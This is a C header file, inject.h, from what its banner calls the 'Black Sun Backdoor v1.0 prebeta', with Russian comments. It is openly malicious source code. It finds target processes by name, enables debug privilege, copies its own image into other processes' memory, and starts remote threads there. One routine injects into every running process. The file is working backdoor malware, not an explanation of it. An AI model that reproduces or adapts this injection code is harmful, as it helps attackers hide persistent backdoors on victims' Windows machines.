/*
 *  ---------------------------------------------------------------------
 * 	       ____  _            _     _____             
 * 	      |  _ \| |          | |   / ____|            
 * 	      | |_) | | __ _  ___| | _| (___  _   _ _ __  
 * 	      |  _ <| |/ _` |/ __| |/ /\___ \| | | | '_ \ 
 * 	      | |_) | | (_| | (__|   < ____) | |_| | | | |
 * 	      |____/|_|\__,_|\___|_|\_\_____/ \__,_|_| |_|
 *                 Black Sun Backdoor v1.0 prebeta        
 *
 *                          (x) Cytech 2007
 *
 *  ---------------------------------------------------------------------
 *  [inject.h]
 *      Модуль внедрения в адресное пространство чужого процесса 
 *      с помощью технологии Process-Injection. 
 *  ---------------------------------------------------------------------
 */

 
// ------------------ [ Получение PID по его имени процесса ] ------------------ //

static DWORD GetPIDbyName(LPTSTR p_Name)
{
	HANDLE m_Snap;

	PROCESSENTRY32 pe = { sizeof(pe) };
	m_Snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);

	if (m_Snap == INVALID_HANDLE_VALUE) 
	{
		return 0; 
	}
	
	if (!Process32First(m_Snap, &pe)) 
	{
		return 0;
	}
	
	do 
	{
		if( !lstrcmpi(pe.szExeFile, p_Name))
		{		
			return pe.th32ProcessID;
		}
	} while (Process32Next(m_Snap, &pe));

	CloseHandle(m_Snap);

	return 0;
}

// ------------------ [ Process Injection ] ------------------ //

static DWORD ProcessInject(HANDLE p_handle, DWORD (WINAPI f_Main)(LPVOID))
{		

	PBYTE Buffer, pMem;
	HANDLE hModule, hInjThread;
	DWORD dwRead, dwSize, dwOldProt, wNumBytes;
	IMAGE_DOS_HEADER ImageDosHeader;
	IMAGE_OPTIONAL_HEADER32 ImageOptionalHeader;
	BOOL bVProtect, bRPMem;
	DWORD dwNumBytes;
	dwRead = 0; dwSize = 0;
	
		hModule = GetModuleHandle(NULL);
		dwSize = ((PIMAGE_OPTIONAL_HEADER)((LPVOID)((BYTE *)(BASEADDRESS) + 
			((PIMAGE_DOS_HEADER)(BASEADDRESS))->e_lfanew 
				+ sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER))))->SizeOfImage;

		Buffer = (PBYTE)VirtualAlloc(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

		if (Buffer == NULL)
		{
			return FALSE;
		}
		
		bRPMem = ReadProcessMemory(GetCurrentProcess(), (LPCVOID)BASEADDRESS, (LPVOID)Buffer, dwSize, &dwRead);	
	
		if (bRPMem == 0)
		{
			return FALSE;
		}

		VirtualFreeEx(p_handle, (LPVOID)BASEADDRESS, dwRead, MEM_RELEASE);
		pMem = (PBYTE)VirtualAllocEx(p_handle, (LPVOID)BASEADDRESS, dwRead, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		VirtualProtectEx(p_handle, pMem , dwRead, PAGE_EXECUTE_READWRITE, &dwOldProt);
	
		if (!WriteProcessMemory(p_handle, pMem, Buffer, dwRead, &dwNumBytes))
		{
			return FALSE;
		}
		hInjThread = CreateRemoteThread(p_handle, 0, 0, &f_Main, NULL, 0, NULL); 
		
		if (hInjThread == NULL) 			 
		{									 
		   return FALSE;
		}
	return TRUE;
}

static DWORD StartProcInject(DWORD dwPid, LPTSTR p_Name, DWORD (WINAPI f_Main)(LPVOID))
{
	HANDLE hProcess;
	
	SetPrivilege(SE_DEBUG_PRIV, TRUE);
	
	if (dwPid == NULL)
	{

			dwPid = GetPIDbyName(p_Name); 
			if(dwPid == 0)
			{
				return FALSE;
			}
	}

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	
	if (hProcess == NULL)
	{
		return FALSE;
	}

	ProcessInject(hProcess, f_Main);

	if(ProcessInject == FALSE) 
	{
		return FALSE;
	}
	
	SetPrivilege(SE_DEBUG_PRIV, FALSE);
  return TRUE; 
}

// ------------------ [ Инжектирование во все процессы ] ------------------ //


static DWORD WINAPI InjectAllProcesses(DWORD (WINAPI f_Main)(LPVOID))
{
	BOOL ret, flag = TRUE;
	HANDLE m_Snap = INVALID_HANDLE_VALUE;
	PROCESSENTRY32 pe = {sizeof(pe)};

	// SetPrivilege(SE_DEBUG_PRIV, TRUE);
	
	m_Snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);

	if (m_Snap == INVALID_HANDLE_VALUE)
	{
		return NULL;
	}
	if (!Process32First(m_Snap, &pe))
	{
		return NULL;
	}

 	 do {
			if (pe.th32ProcessID == GetCurrentProcessId()) continue;
			if (pe.th32ProcessID == GetPIDbyName(FIRSTINJPROC)) continue; // дважды в FISTINJECTPROC не инжектимся!
			ret = StartProcInject(pe.th32ProcessID, NULL, f_Main);	
			
		} while (Process32Next(m_Snap, &pe)); 

	// SetPrivilege(SE_DEBUG_PRIV, FALSE);

	return NULL;
}